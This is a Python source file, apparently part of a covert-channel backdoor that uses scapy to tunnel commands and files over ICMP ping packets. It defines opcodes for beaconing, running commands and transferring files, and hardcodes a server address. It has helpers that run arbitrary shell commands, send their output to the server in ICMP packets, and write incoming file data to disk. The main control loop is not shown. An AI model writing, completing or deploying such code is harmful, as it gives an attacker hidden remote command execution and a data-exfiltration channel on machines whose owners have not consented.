import os
from scapy.all import *
import signal
import subprocess
import threading


from scapy.all import *
import threading

FILE = 0xcafe           # module to send file
RUN = 0xbabe            # module to run command
BEACON = 0xdead         # client is ready to recieve command
BEGIN_OUTPUT = 0xAAA    # server to open output_file
BEGIN_FILE = 0xBE       # server to open file - name of the file in the data
IN_TRANSFER = 0xCCC     # server to continue writing to the opened file
EF = 0xEF              # server to close the opened file

SERVER_ADR = "192.168.1.22"
ICMP_RESPONSE = "icmp[0]=0"
ICMP_REQUEST = "icmp[0]=8"

LOG_OUTPUT = ".log_output.txt"



def pkt_send(dest,data,icmp_type,id_packet):
    pkt = IP(dst=dest)/ICMP(type=icmp_type,id=id_packet)/data

    try:
        frags=fragment(pkt,fragsize=1400)    # divide the packet into fragments if it's over 1400 bytes
        for frg in frags:                    # by default, the router might send packets over 1500 bytes, which the computer cannot send forward
            send(frg)                            # send each fragment independently
    except:
    	print("failed to send in frags")


def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
    
def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
def extract_data(packet):
    try:
        return packet[0][Raw].load.decode('utf-8')
    except:
        return str(None)
    
def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    # output_stream = os.popen(cmd)
    # pkt_send(dest=server_adr,data=output_stream.read())
    
    
def open_file(file_name):
	flags = os.O_WRONLY|os.O_CREAT|os.O_APPEND
	fd = os.open(file_name,flags)
	return fd

def write_to_file(fd,to_write):
	encoded_content = to_write.encode('utf-8')
	os.write(fd,encoded_content)
        
def close_file(fd):
    os.close(fd)
    
def check_type(packet):
    return packet[0][ICMP].id


    
    
    